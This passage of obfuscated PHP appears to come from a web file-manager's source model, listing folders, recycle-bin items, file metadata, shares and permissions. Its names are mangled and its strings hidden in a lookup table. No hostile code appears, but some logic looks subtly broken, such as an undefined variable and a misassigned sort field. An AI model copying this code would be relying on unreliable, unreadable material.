$†¥¾ö¨[$Ÿ›ı¯¥µ] = array(); } $†¥¾ö¨[$Ÿ›ı¯¥µ][] = $®Ï½‘¬²[$»Åà”Ñ¹[523]]; $Ó•¢Çà[$®Ï½‘¬²[$»Åà”Ñ¹[87]]] = $®Ï½‘¬²; } $Ê¹§¿Œ = array(); $…¨©ĞÁ¢ = array(); $êË×ëàÜ = array(); foreach ($†¥¾ö¨ as $†°îº  => $òøÒ¤›¶) { $²î Ç®œ = !0; if (!$¶ÙÈŠÓÌ) { $Ê¹§¿Œ[] = $†°îº ; continue; } foreach ($¶ÙÈŠÓÌ as $Ï«êºòø) { if (!in_array($Ï«êºòø, $òøÒ¤›¶)) { $²î Ç®œ = !1; break; } } if (!$²î Ç®œ) { continue; } if (!is_numeric($†°îº )) { $ğ°¿Ôóµ = $Ó•¢Çà[$†°îº ]; $ÅÛ¢¹ = array($»Åà”Ñ¹[32] => $ğ°¿Ôóµ[$»Åà”Ñ¹[32]], $»Åà”Ñ¹[87] => $ğ°¿Ôóµ[$»Åà”Ñ¹[87]], $»Åà”Ñ¹[33] => $ğ°¿Ôóµ[$»Åà”Ñ¹[33]], $»Åà”Ñ¹[90] => array($»Åà”Ñ¹[524] => 1), $»Åà”Ñ¹[232] => !0); if ($ğ°¿Ôóµ[$»Åà”Ñ¹[33]] == $»Åà”Ñ¹[230]) { $êË×ëàÜ[] = $ÅÛ¢¹; } if ($ğ°¿Ôóµ[$»Åà”Ñ¹[33]] == $»Åà”Ñ¹[78]) { $…¨©ĞÁ¢[] = $ÅÛ¢¹; } continue; } $Ê¹§¿Œ[] = $†°îº ; } if ($Ê¹§¿Œ) { $…š²®¸ = $this->listSource(array($»Åà”Ñ¹[514] => array($»Åà”Ñ¹[515], $Ê¹§¿Œ))); } $…š²®¸ = $…š²®¸ ? $…š²®¸ : array($»Åà”Ñ¹[85] => array(), $»Åà”Ñ¹[86] => array()); $…š²®¸[$»Åà”Ñ¹[85]] = array_merge($…š²®¸[$»Åà”Ñ¹[85]], $…¨©ĞÁ¢); $…š²®¸[$»Åà”Ñ¹[86]] = array_merge($…š²®¸[$»Åà”Ñ¹[86]], $êË×ëàÜ); if (isset($…š²®¸[$»Åà”Ñ¹[443]]) && count($Ê¹§¿Œ) == $…š²®¸[$»Åà”Ñ¹[443]][$»Åà”Ñ¹[444]]) { return $…š²®¸; } $¨˜ş¥ê„ = array(); $¡ôÛ¤Î = array_to_keyvalue($…š²®¸[$»Åà”Ñ¹[85]], $»Åà”Ñ¹[12], $»Åà”Ñ¹[191]); $×”ÙÒ = array_to_keyvalue($…š²®¸[$»Åà”Ñ¹[86]], $»Åà”Ñ¹[12], $»Åà”Ñ¹[191]); $Ü–Ğç¬Å = array_merge($×”ÙÒ, $¡ôÛ¤Î); foreach ($Ê¹§¿Œ as $Ÿ›ı¯¥µ) { if (!in_array($Ÿ›ı¯¥µ, $Ü–Ğç¬Å)) { $¨˜ş¥ê„[] = $Ÿ›ı¯¥µ; } } if ($¨˜ş¥ê„) { Model($»Åà”Ñ¹[525])->removeBySource($¨˜ş¥ê„); } return $…š²®¸; } public function listUserRecycle() { $Çµ­Ù± =& $_SERVER[”øäÃÍª]; $ÑÕßñ„„ = Model($Çµ­Ù±[526])->listData(); if (!$ÑÕßñ„„) { return array(); } $İ¦¡Åâƒ = array($Çµ­Ù±[514] => array($Çµ­Ù±[515], $ÑÕßñ„„), $Çµ­Ù±[527] => 1); return $this->listSource($İ¦¡Åâƒ); } public function listSource($Œæ„”Ï, $Í™Â¨‚Ù = 3000, $‹±”ü™ = false) { $é²ôº²Á =& $_SERVER[”øäÃÍª]; if (!isset($Œæ„”Ï[$é²ôº²Á[528]])) { $Œæ„”Ï[$é²ôº²Á[528]] = 0; } if (isset($Œæ„”Ï[$é²ôº²Á[190]]) && $Œæ„”Ï[$é²ôº²Á[190]] == $é²ôº²Á[228]) { $Œæ„”Ï[$é²ôº²Á[509]] = array($é²ôº²Á[464], $é²ôº²Á[12]); } if (isset($Œæ„”Ï[$é²ôº²Á[190]])) { $Œæ„”Ï[$é²ôº²Á[190]] = intval($Œæ„”Ï[$é²ôº²Á[190]]); } $ÌÖÁÄÄñ = $é²ôº²Á[529]; $Òµ•³şš = $this->field($ÌÖÁÄÄñ)->_makeOrder()->where($Œæ„”Ï)->selectPage($Í™Â¨‚Ù); $this->_listPageCheck($Òµ•³şš, $ÌÖÁÄÄñ, $Œæ„”Ï); $this->_listDataApply($Òµ•³şš[$é²ôº²Á[446]], $‹±”ü™); $this->_listMake($Òµ•³şš); return $Òµ•³şš; } private function _listPageCheck(&$ƒú¦ÌË”, $ü×ıÊ™, $Áøóô¼ı) { $îÔĞ¾Ü =& $_SERVER[”øäÃÍª]; if (!is_array($ƒú¦ÌË”[$îÔĞ¾Ü[443]])) { return; } $™ƒ­’ÓÇ = $ƒú¦ÌË”[$îÔĞ¾Ü[443]]; if ($™ƒ­’ÓÇ[$îÔĞ¾Ü[445]] <= 1) { return; } if ($™ƒ­’ÓÇ[$îÔĞ¾Ü[444]] >= 100000) { return; } if (Model($îÔĞ¾Ü[530])->get($îÔĞ¾Ü[531]) != $îÔĞ¾Ü[532]) { return; } $ü×ıÊ™ = str_replace(array($îÔĞ¾Ü[53], $îÔĞ¾Ü[417], $îÔĞ¾Ü[285]), $îÔĞ¾Ü[12], $ü×ıÊ™); $ü×ıÊ™ = $îÔĞ¾Ü[533] . str_replace($îÔĞ¾Ü[50], $îÔĞ¾Ü[534], $ü×ıÊ™) . $îÔĞ¾Ü[535]; $ğşÔµ«Ş = $îÔĞ¾Ü[536]; $ğşÔµ«Ş = $ğşÔµ«Ş . $îÔĞ¾Ü[537]; $¬í÷ÎÕ = $™ƒ­’ÓÇ[$îÔĞ¾Ü[439]] * ($™ƒ­’ÓÇ[$îÔĞ¾Ü[428]] - 1) . $îÔĞ¾Ü[50] . $™ƒ­’ÓÇ[$îÔĞ¾Ü[439]]; $™ÃËÔŞ = $this->_makeOrder(!0); $¯‹¼’¶ = $îÔĞ¾Ü[533] . str_replace($îÔĞ¾Ü[50], $îÔĞ¾Ü[534], $™ÃËÔŞ[0]); if (strpos($¯‹¼’¶, $îÔĞ¾Ü[538])) { $¯‹¼’¶ = str_replace($îÔĞ¾Ü[538], $îÔĞ¾Ü[539], $¯‹¼’¶); } else { $¯‹¼’¶ .= $îÔĞ¾Ü[540] . $™ÃËÔŞ[1]; } $âÆú³¬± = array(); foreach ($Áøóô¼ı as $”‚‡ÚŞ => $¿®Ï¸ƒĞ) { $âÆú³¬±[$îÔĞ¾Ü[533] . $”‚‡ÚŞ] = $¿®Ï¸ƒĞ; } $this->alias($îÔĞ¾Ü[541])->field($ü×ıÊ™)->limit($¬í÷ÎÕ)->order($¯‹¼’¶); $‰ûÊóé = $this->join($ğşÔµ«Ş)->where($âÆú³¬±)->select(); if ($‰ûÊóé) { $ƒú¦ÌË”[$îÔĞ¾Ü[446]] = $‰ûÊóé; } } protected function _makeOrder($€°öûÔØ = false) { $Ã™¥¹ßô =& $_SERVER[”øäÃÍª]; $ı‰ı‡»ç = Model($Ã™¥¹ßô[542])->get($Ã™¥¹ßô[543]); $±ñ¾·Ü£ = Model($Ã™¥¹ßô[542])->get($Ã™¥¹ßô[544]); $û‡ö©Û = array($Ã™¥¹ßô[545] => $Ã™¥¹ßô[546], $Ã™¥¹ßô[547] => $Ã™¥¹ßô[548]); $³öí¢ = array($Ã™¥¹ßô[32] => $Ã™¥¹ßô[32], $Ã™¥¹ßô[79] => $Ã™¥¹ßô[79], $Ã™¥¹ßô[166] => $Ã™¥¹ßô[509], $Ã™¥¹ßô[549] => $Ã™¥¹ßô[549], $Ã™¥¹ßô[550] => $Ã™¥¹ßô[551], $Ã™¥¹ßô[231] => $Ã™¥¹ßô[231], $Ã™¥¹ßô[88] => $Ã™¥¹ßô[88]); $ìöí­ê® = Input::get($Ã™¥¹ßô[552], $Ã™¥¹ßô[7], $ı‰ı‡»ç, array_keys($³öí¢)); $”âè†Ÿâ = Input::get($Ã™¥¹ßô[553], $Ã™¥¹ßô[7], $±ñ¾·Ü£, array_keys($û‡ö©Û)); if (!in_array($ìöí­ê®, array_keys($³öí¢))) { $ìöí­ê® = $Ã™¥¹ßô[32]; } if (!in_array($”âè†Ÿâ, array_keys($û‡ö©Û))) { $ìöí­ê® = $Ã™¥¹ßô[545]; } if ($ìöí­ê® == $Ã™¥¹ßô[32]) { } $Ğ”ŠÎÖ» = $Ã™¥¹ßô[554] . $³öí¢[$ìöí­ê®] . $Ã™¥¹ßô[53] . $û‡ö©Û[$”âè†Ÿâ]; $Ğ”ŠÎÖ» = rtrim(trim($Ğ”ŠÎÖ»), $Ã™¥¹ßô[50]); if ($€°öûÔØ) { return array($Ğ”ŠÎÖ», $û‡ö©Û[$”âè†Ÿâ]); } return $this->order($Ğ”ŠÎÖ»); } protected function _listDataApplyItem($·Ğù¥„¬, $ˆ”ğŞßŸ = false) { $Ñ…½ù¹´ = array($·Ğù¥„¬); $this->_listDataApply($Ñ…½ù¹´, $ˆ”ğŞßŸ); return $Ñ…½ù¹´[0]; } protected function _listDataApply(&$Ì½ÁÄÜÔ, $– ‡úáä = false) { $»ÅÓ›—¢ =& $_SERVER[”øäÃÍª]; if (!$Ì½ÁÄÜÔ) { $Ì½ÁÄÜÔ = array(); return; } $ú°ä‘¼ = array_to_keyvalue($Ì½ÁÄÜÔ, $»ÅÓ›—¢[12], $»ÅÓ›—¢[191]); $ú°ä‘¼ = array_unique($ú°ä‘¼); $ú°ä‘¼ = array_to_int($ú°ä‘¼); $this->_listSourceCache($Ì½ÁÄÜÔ); if (!$– ‡úáä) { $this->_listAppendMeta($Ì½ÁÄÜÔ, $ú°ä‘¼); $this->_listAppendFileMeta($Ì½ÁÄÜÔ, $ú°ä‘¼); $this->_listAppendChildren($Ì½ÁÄÜÔ, $ú°ä‘¼); } $this->_listAppendPath($Ì½ÁÄÜÔ); $this->_listAppendAuth($Ì½ÁÄÜÔ); $this->_listAppendSourceInfo($Ì½ÁÄÜÔ, $ú°ä‘¼); $this->_listAppendUser($Ì½ÁÄÜÔ); $this->_listFilterInfo($Ì½ÁÄÜÔ, $– ‡úáä); $this->_listAppendAuthSecret($Ì½ÁÄÜÔ); } protected function _listSourceCache($Œõ€†È«) { $‡¥„ıŞù =& $_SERVER[”øäÃÍª]; foreach ($Œõ€†È« as $ÌØ˜—Ğ) { self::$cacheSourceInfo[$‡¥„ıŞù[555] . $ÌØ˜—Ğ[$‡¥„ıŞù[191]]] = $ÌØ˜—Ğ; } } protected function _listFilterInfo(&$ÁÍà¸Ä, $±É›ÓÂ = false) { $È…Ğ»¯÷ =& $_SERVER[”øäÃÍª]; foreach ($ÁÍà¸Ä as &$ñ»ïÀ¿) { $ñ»ïÀ¿ = $this->pathInfoFilter($ñ»ïÀ¿); self::$cachePathInfo[$È…Ğ»¯÷[556] . intval($±É›ÓÂ) . $È…Ğ»¯÷[476] . $ñ»ïÀ¿[$È…Ğ»¯÷[191]]] = $ñ»ïÀ¿; } unset($ñ»ïÀ¿); } protected function _listMake(&$–ñ †¼¨) { $ª´Ş¡À¼ =& $_SERVER[”øäÃÍª]; $–ñ †¼¨[$ª´Ş¡À¼[85]] = array(); $–ñ †¼¨[$ª´Ş¡À¼[86]] = array(); foreach ($–ñ †¼¨[$ª´Ş¡À¼[446]] as $’§¾¢­“) { $ûöÖÕ±— = $’§¾¢­“[$ª´Ş¡À¼[508]] == 1 ? $ª´Ş¡À¼[85] : $ª´Ş¡À¼[86]; $–ñ †¼¨[$ûöÖÕ±—][] = $’§¾¢­“; } unset($–ñ †¼¨[$ª´Ş¡À¼[446]]); } protected function _listAppendMeta(&$ÙŸ²«Ø, $˜ùßŠ±Ö) { $ëğå¡„ =& $_SERVER[”øäÃÍª]; $âÔ®×‰ = array($ëğå¡„[514] => array($ëğå¡„[515], $˜ùßŠ±Ö)); $ïûïŸ— = Model($ëğå¡„[557])->field($ëğå¡„[558])->where($âÔ®×‰)->select(); if (!$ïûïŸ—) { return; } $Ò•©Ä = array($ëğå¡„[559], $ëğå¡„[560], $ëğå¡„[539]); $šï¥Î‡¸ = array(); foreach ($ïûïŸ— as $¥î¯Åà) { if (!isset($šï¥Î‡¸[$¥î¯Åà[$ëğå¡„[191]]])) { $šï¥Î‡¸[$¥î¯Åà[$ëğå¡„[191]]] = array(); } if (in_array($¥î¯Åà[$ëğå¡„[95]], $Ò•©Ä)) { continue; } if ($¥î¯Åà[$ëğå¡„[95]] == $ëğå¡„[561]) { $¥î¯Åà[$ëğå¡„[451]] = $ëğå¡„[562]; } $šï¥Î‡¸[$¥î¯Åà[$ëğå¡„[191]]][$¥î¯Åà[$ëğå¡„[95]]] = $¥î¯Åà[$ëğå¡„[451]]; } foreach ($ÙŸ²«Ø as &$½ÈÜß£™) { $½ÈÜß£™[$ëğå¡„[563]] = !1; if (isset($šï¥Î‡¸[$½ÈÜß£™[$ëğå¡„[191]]])) { $½ÈÜß£™[$ëğå¡„[563]] = $šï¥Î‡¸[$½ÈÜß£™[$ëğå¡„[191]]]; } if ($this->fileIsLock($½ÈÜß£™) && $½ÈÜß£™[$ëğå¡„[510]]) { $¿œÁæ¦È = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $½ÈÜß£™[$ëğå¡„[510]][$ëğå¡„[511]] = AuthModel::authDisable($½ÈÜß£™[$ëğå¡„[510]][$ëğå¡„[511]], $¿œÁæ¦È); $½ÈÜß£™[$ëğå¡„[510]][$ëğå¡„[564]][$ëğå¡„[510]] = $½ÈÜß£™[$ëğå¡„[510]][$ëğå¡„[511]]; } } unset($½ÈÜß£™); } protected function _listAppendFileMeta(&$Ø…ÒÈÄ­, $˜ë£ò³©) { $²Õ„ù =& $_SERVER[”øäÃÍª]; $Û†´°© = array_to_keyvalue($Ø…ÒÈÄ­, $²Õ„ù[12], $²Õ„ù[565]); $Û†´°© = array_filter(array_unique($Û†´°©)); $Û†´°© = array_to_int($Û†´°©); if (!$Û†´°©) { return; } $ï“Ì‰ûÄ = array($²Õ„ù[566] => array($²Õ„ù[515], $Û†´°©)); $Ÿ¹Ç™Ëä = $²Õ„ù[567]; $÷«Å““‘ = Model($²Õ„ù[568])->field($Ÿ¹Ç™Ëä)->where($ï“Ì‰ûÄ)->select(); $÷«Å““‘ = array_to_keyvalue($÷«Å““‘, $²Õ„ù[565]); $ÕİÛÒ = Model($²Õ„ù[569])->field($²Õ„ù[570])->where($ï“Ì‰ûÄ)->select(); $ÕİÛÒ = $ÕİÛÒ ? $ÕİÛÒ : array(); $Ô­÷½ëÉ = array(); foreach ($ÕİÛÒ as $¡«ÕšÌ²) { if (!isset($Ô­÷½ëÉ[$¡«ÕšÌ²[$²Õ„ù[565]]])) { $Ô­÷½ëÉ[$¡«ÕšÌ²[$²Õ„ù[565]]] = array(); } $Ô­÷½ëÉ[$¡«ÕšÌ²[$²Õ„ù[565]]][$¡«ÕšÌ²[$²Õ„ù[95]]] = $¡«ÕšÌ²[$²Õ„ù[451]]; } foreach ($Ø…ÒÈÄ­ as &$¾Æº½ö•) { $ù‘‹•¡Œ = $¾Æº½ö•[$²Õ„ù[565]]; if (!$ù‘‹•¡Œ || !is_array($÷«Å““‘[$ù‘‹•¡Œ])) { continue; } $ñşØ±³ = $÷«Å““‘[$ù‘‹•¡Œ]; $ñşØ±³[$²Õ„ù[79]] = $¾Æº½ö•[$²Õ„ù[79]]; $ñşØ±³[$²Õ„ù[32]] = $¾Æº½ö•[$²Õ„ù[32]]; if (!$ñşØ±³[$²Õ„ù[571]]) { Model($²Õ„ù[568])->fileMd5Check($ñşØ±³); } if (!isset(self::$cacheFileInfo[$²Õ„ù[572] . $ù‘‹•¡Œ])) { self::$cacheFileInfo[$²Õ„ù[572] . $ù‘‹•¡Œ] = array_merge(array(), $ñşØ±³); } unset($÷«Å““‘[$ù‘‹•¡Œ][$²Õ„ù[87]]); $¼‡í¤Îö = isset($Ô­÷½ëÉ[$ù‘‹•¡Œ]) && is_array($Ô­÷½ëÉ[$ù‘‹•¡Œ]) ? $Ô­÷½ëÉ[$ù‘‹•¡Œ] : array(); $¾Æº½ö•[$²Õ„ù[167]] = array_merge($¼‡í¤Îö, $÷«Å““‘[$ù‘‹•¡Œ]); if (isset($¾Æº½ö•[$²Õ„ù[167]][$²Õ„ù[182]])) { $¾Æº½ö•[$²Õ„ù[182]] = json_decode($¾Æº½ö•[$²Õ„ù[167]][$²Õ„ù[182]], !0); unset($¾Æº½ö•[$²Õ„ù[167]][$²Õ„ù[182]]); } } unset($¾Æº½ö•); } protected function _listAppendSourceInfo(&$™¦€ÜŸà, $†¼ù×‡) { $éÌæ¢óÅ =& $_SERVER[”øäÃÍª]; $˜ÇÇ±¼ë = Model($éÌæ¢óÅ[573])->listData(); $±–îêºĞ = Model($éÌæ¢óÅ[522])->listData(); $ÅåÒüÂ = Model($éÌæ¢óÅ[512])->listData(); $·Ì†Úãà = Model($éÌæ¢óÅ[574])->listSimple(); $¯İˆŸÂª = array_to_keyvalue($˜ÇÇ±¼ë, $éÌæ¢óÅ[487]); $¯Òœ²ş‚ = array_to_keyvalue_group($±–îêºĞ, $éÌæ¢óÅ[87], $éÌæ¢óÅ[523]); $ˆ«ö“şÎ = array_to_keyvalue($ÅåÒüÂ, $éÌæ¢óÅ[87]); $çóœÎé = array_to_keyvalue_group($·Ì†Úãà, $éÌæ¢óÅ[191]); foreach ($™¦€ÜŸà as &$Ó’±‡‹Ü) { $Ó’±‡‹Ü[$éÌæ¢óÅ[90]] = array($éÌæ¢óÅ[575] => 0, $éÌæ¢óÅ[576] => 0, $éÌæ¢óÅ[577] => 0); if (isset($ˆ«ö“şÎ[$Ó’±‡‹Ü[$éÌæ¢óÅ[191]]])) { $Ó’±‡‹Ü[$éÌæ¢óÅ[90]][$éÌæ¢óÅ[578]] = 1; $Ó’±‡‹Ü[$éÌæ¢óÅ[90]][$éÌæ¢óÅ[579]] = $ˆ«ö“şÎ[$Ó’±‡‹Ü[$éÌæ¢óÅ[191]]][$éÌæ¢óÅ[32]]; } if ($¯Òœ²ş‚ && $¯İˆŸÂª && isset($¯Òœ²ş‚[$Ó’±‡‹Ü[$éÌæ¢óÅ[191]]])) { $Ó’±‡‹Ü[$éÌæ¢óÅ[90]][$éÌæ¢óÅ[580]] = array(); foreach ($¯Òœ²ş‚[$Ó’±‡‹Ü[$éÌæ¢óÅ[191]]] as $Û‚çêÃñ) { $õ‰¦„ºÙ = $¯İˆŸÂª[$Û‚çêÃñ]; $Ó’±‡‹Ü[$éÌæ¢óÅ[90]][$éÌæ¢óÅ[580]][] = array($éÌæ¢óÅ[581] => $õ‰¦„ºÙ[$éÌæ¢óÅ[487]], $éÌæ¢óÅ[517] => $õ‰¦„ºÙ[$éÌæ¢óÅ[32]], $éÌæ¢óÅ[582] => $õ‰¦„ºÙ[$éÌæ¢óÅ[583]]); } } if ($çóœÎé && isset($çóœÎé[$Ó’±‡‹Ü[$éÌæ¢óÅ[191]]])) { $Ó’±‡‹Ü[$éÌæ¢óÅ[90]][$éÌæ¢óÅ[584]] = array(); foreach ($çóœÎé[$Ó’±‡‹Ü[$éÌæ¢óÅ[191]]] as $™¹íËÙó) { $Ó’±‡‹Ü[$éÌæ¢óÅ[90]][$éÌæ¢óÅ[584]] = $this->shareFilterShow($™¹íËÙó); } } } unset($Ó’±‡‹Ü); return $™¦€ÜŸà; } protected function shareFilterShow($ı“¥»é) { $±›å‡âË =& $_SERVER[”øäÃÍª]; if (!$ı“¥»é) { return $ı“¥»é; } $—ëŞ«µ« = $±›å‡âË[585]; if ($ı“¥»é[$±›å‡âË[586]] == $±›å‡âË[91]) { $—ëŞ«µ« .= $±›å‡âË[587]; } if (is_array($ı“¥»é[$±›å‡âË[588]]) && is_array($ı“¥»é[$±›å‡âË[588]][$±›å‡âË[589]])) { $ı“¥»é[$±›å‡âË[588]][$±›å‡âË[589]] = $±›å‡âË[590]; } if (!$êœŸıĞ[$±›å‡âË[591]] && $êœŸıĞ[$±›å‡âË[191]] != $±›å‡âË[228]) { $êœŸıĞ[$±›å‡âË[591]] = KodIO::make($êœŸıĞ[$±›å‡âË[191]]); } $ı“¥»é = array_field_key($ı“¥»é, explode($±›å‡âË[50], $—ëŞ«µ«)); return $ı“¥»é; } protected function _listAppendChildren(&$’ÎÆ£±, $«ü •†) { $õÎšÂá =& $_SERVER[”øäÃÍª]; $Ãº©Ó«Æ = array(); $¸¹ß¦ª = array($õÎšÂá[239] => 0, $õÎšÂá[240] => 0); foreach ($’ÎÆ£± as &$ºá‘‘®) { if (!$ºá‘‘®[$õÎšÂá[508]]) { continue; } $Ãº©Ó«Æ[] = intval($ºá‘‘®[$õÎšÂá[191]]); } unset($ºá‘‘®); if (!$Ãº©Ó«Æ) { return; } $ ıÇŠË¥ = array($õÎšÂá[190] => array($õÎšÂá[7], $Ãº©Ó«Æ), $õÎšÂá[528] => 0); $û›Ö…¯• = array($õÎšÂá[190], $õÎšÂá[508], $õÎšÂá[592] => $õÎšÂá[593]); $à—íÂ¿Ô = $this->field($û›Ö…¯•)->where($ ıÇŠË¥)->group($õÎšÂá[594])->select(); $ª¬å²ì = array(); foreach ($à—íÂ¿Ô as $ÈÅæ±›Š) { $ÔöÛÑ×ú = $ÈÅæ±›Š[$õÎšÂá[190]]; $ŒÔ«¹îå = $ÈÅæ±›Š[$õÎšÂá[508]] == $õÎšÂá[91] ? $õÎšÂá[240] : $õÎšÂá[239]; if (!isset($ª¬å²ì[$ÔöÛÑ×ú])) { $ª¬å²ì[$ÔöÛÑ×ú] = array($õÎšÂá[239] => 0, $õÎšÂá[240] => 0); } $ª¬å²ì[$ÔöÛÑ×ú][$ŒÔ«¹îå] += $ÈÅæ±›Š[$õÎšÂá[593]]; } foreach ($’ÎÆ£± as &$ºá‘‘®) { if (!$ºá‘‘®[$õÎšÂá[508]]) { continue; } $ÛÖÒğÉü = is_array($ª¬å²ì[$ºá‘‘®[$õÎšÂá[191]]]) ? $ª¬å²ì[$ºá‘‘®[$õÎšÂá[191]]] : $¸¹ß¦ª; $ºá‘‘®[$õÎšÂá[240]] = $ÛÖÒğÉü[$õÎšÂá[240]]; $ºá‘‘®[$õÎšÂá[239]] = $ÛÖÒğÉü[$õÎšÂá[239]]; unset($ºá‘‘®[$õÎšÂá[509]]); } unset($ºá‘‘®); } protected function _listAppendAuth(&$©…Ï×îÁ) { $”ìô¾¥† =& $_SERVER[”øäÃÍª]; $µ°˜ó«® = array(); foreach ($©…Ï×îÁ as $®â˜ò®) { if ($®â˜ò®[$”ìô¾¥†[188]] == self::TYPE_GROUP) { $µ°˜ó«®[] = intval($®â˜ò®[$”ìô¾¥†[191]]); } } if (!$µ°˜ó«®) { return; } $é‘‘âï½ = array_to_keyvalue($©…Ï×îÁ, $”ìô¾¥†[191]); $˜¸€µŞš = Model($”ìô¾¥†[595])->getSourceList($µ°˜ó«®, $é‘‘âï½); $Ï¿§Åˆ– = KodUser::isRoot(); foreach ($©…Ï×îÁ as $…ÜÅ½Ğ¿ => &$®â˜ò®) { $®â˜ò®[$”ìô¾¥†[510]] = $˜¸€µŞš[$®â˜ò®[$”ìô¾¥†[191]]]; if (!$®â˜ò®[$”ìô¾¥†[510]] && $®â˜ò®[$”ìô¾¥†[188]] == self::TYPE_GROUP) { $®â˜ò®[$”ìô¾¥†[510]] = Action($”ìô¾¥†[596])->pathGroupAuthMake($®â˜ò®[$”ìô¾¥†[597]]); if (!$®â˜ò®[$”ìô¾¥†[510]] && !$Ï¿§Åˆ–) { $®â˜ò®[$”ìô¾¥†[233]] = !1; $®â˜ò®[$”ìô¾¥†[232]] = !1; } } if ($®â˜ò®[$”ìô¾¥†[510]]) { $®â˜ò®[$”ìô¾¥†[233]] = AuthModel::authCheckEdit($®â˜ò®[$”ìô¾¥†[510]][$”ìô¾¥†[511]]); $®â˜ò®[$”ìô¾¥†[232]] = AuthModel::authCheckView($®â˜ò®[$”ìô¾¥†[510]][$”ìô¾¥†[511]]); } $this->groupPathDisplay($®â˜ò®); } unset($®â˜ò®); } public function _listAppendAuthSecret(&$Ñ´î»â) { $‘ÁÒ»ßô =& $_SERVER[”øäÃÍª]; if (Model($‘ÁÒ»ßô[530])->get($‘ÁÒ»ßô[598]) != $‘ÁÒ»ßô[91]) { return; } static $¸İÊ‡šÛ = false; if (!$¸İÊ‡šÛ) { $¬œÀÚï = Model($‘ÁÒ»ßô[599]); $˜¿»ùô€ = Model($‘ÁÒ»ßô[600]); $¸İÊ‡šÛ = $˜¿»ùô€->listData(); $¸İÊ‡šÛ = array_to_keyvalue($¸İÊ‡šÛ, $‘ÁÒ»ßô[191]); $Ìş•êœ¡ = json_decode(Model($‘ÁÒ»ßô[530])->get($‘ÁÒ»ßô[601]), !0); $Ìş•êœ¡ = array_to_keyvalue($Ìş•êœ¡, $‘ÁÒ»ßô[487]); foreach ($¸İÊ‡šÛ as $îö§Î¼¾ => $Í€Ñ×Ï») { $µ×ĞÅï = $Ìş•êœ¡[$Í€Ñ×Ï»[$‘ÁÒ»ßô[602]]]; if (!$µ×ĞÅï) { $˜¿»ùô€->remove($Í€Ñ×Ï»[$‘ÁÒ»ßô[487]]); unset($¸İÊ‡šÛ[$îö§Î¼¾]); continue; } $“¿êè÷° = $¬œÀÚï->listData($µ×ĞÅï[$‘ÁÒ»ßô[510]]); if (!$“¿êè÷°) { $˜¿»ùô€->remove($Í€Ñ×Ï»[$‘ÁÒ»ßô[487]]); unset($¸İÊ‡šÛ[$îö§Î¼¾]); continue; } $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]] = $“¿êè÷°; $Í€Ñ×Ï»[$‘ÁÒ»ßô[603]] = $µ×ĞÅï; $Í€Ñ×Ï»[$‘ÁÒ»ßô[604]] = Model($‘ÁÒ»ßô[605])->getInfoSimpleOuter($Í€Ñ×Ï»[$‘ÁÒ»ßô[549]]); $¸İÊ‡šÛ[$îö§Î¼¾] = $Í€Ñ×Ï»; } } $Ä’ñËáÌ = USER_ID; $–¶‚õäº = array(); $§µ´¹ğ¿ = $this->_listAppendPath($–¶‚õäº, !0); foreach ($Ñ´î»â as $îö§Î¼¾ => &$Í€Ñ×Ï») { if (!is_array($Í€Ñ×Ï»[$‘ÁÒ»ßô[510]])) { continue; } if ($Í€Ñ×Ï»[$‘ÁÒ»ßô[188]] != $‘ÁÒ»ßô[606]) { continue; } if (isset($¸İÊ‡šÛ[$Í€Ñ×Ï»[$‘ÁÒ»ßô[191]]])) { $¨ü«…Ú« = $¸İÊ‡šÛ[$Í€Ñ×Ï»[$‘ÁÒ»ßô[191]]]; if (!is_array($Í€Ñ×Ï»[$‘ÁÒ»ßô[563]])) { $Í€Ñ×Ï»[$‘ÁÒ»ßô[563]] = array(); } $Í€Ñ×Ï»[$‘ÁÒ»ßô[563]][$‘ÁÒ»ßô[607]] = $¨ü«…Ú«[$‘ÁÒ»ßô[602]]; $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[608]] = $¨ü«…Ú«; $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[609]] = $Í€Ñ×Ï»[$‘ÁÒ»ßô[610]]; $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[611]] = $‘ÁÒ»ßô[91]; if ($¨ü«…Ú«[$‘ÁÒ»ßô[549]] != $Ä’ñËáÌ) { $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[511]] = $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[511]] & $¨ü«…Ú«[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[510]]; } continue; } $••öî‰² = $this->parentLevelArray($Í€Ñ×Ï»[$‘ÁÒ»ßô[612]]); $”ÒÓ»„¹ = array_reverse($••öî‰²); foreach ($”ÒÓ»„¹ as $¬—š­ªŒ => $¢ÇæÒ¹) { if (!isset($¸İÊ‡šÛ[$¢ÇæÒ¹])) { continue; } $¨ü«…Ú« = $¸İÊ‡šÛ[$¢ÇæÒ¹]; $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[608]] = $¨ü«…Ú«; if ($¨ü«…Ú«[$‘ÁÒ»ßô[549]] != $Ä’ñËáÌ) { $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[511]] = $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[511]] & $¨ü«…Ú«[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[510]]; } $’²Â˜§Ú = $‘ÁÒ»ßô[12]; $Áî…¢Ğø = count($••öî‰²) - $¬—š­ªŒ; for ($ş†’ºù® = 0; $ş†’ºù® < $Áî…¢Ğø; $ş†’ºù®++) { if (!isset($§µ´¹ğ¿[$••öî‰²[$ş†’ºù®]])) { $’²Â˜§Ú = $‘ÁÒ»ßô[12]; break; } $’²Â˜§Ú = $’²Â˜§Ú . rtrim($§µ´¹ğ¿[$••öî‰²[$ş†’ºù®]], $‘ÁÒ»ßô[8]) . $‘ÁÒ»ßô[8]; } $Í€Ñ×Ï»[$‘ÁÒ»ßô[510]][$‘ÁÒ»ßô[609]] = rtrim($’²Â˜§Ú, $‘ÁÒ»ßô[8]) . $‘ÁÒ»ßô[8]; break; } } unset($Í€Ñ×Ï»); } public function groupPathDisplay(&$™’öî) { $‰Œå¡ÕŠ =& $_SERVER[”øäÃÍª]; if ($™’öî[$‰Œå¡ÕŠ[188]] != self::TYPE_GROUP) { return; } $ò…Â·—¡ = 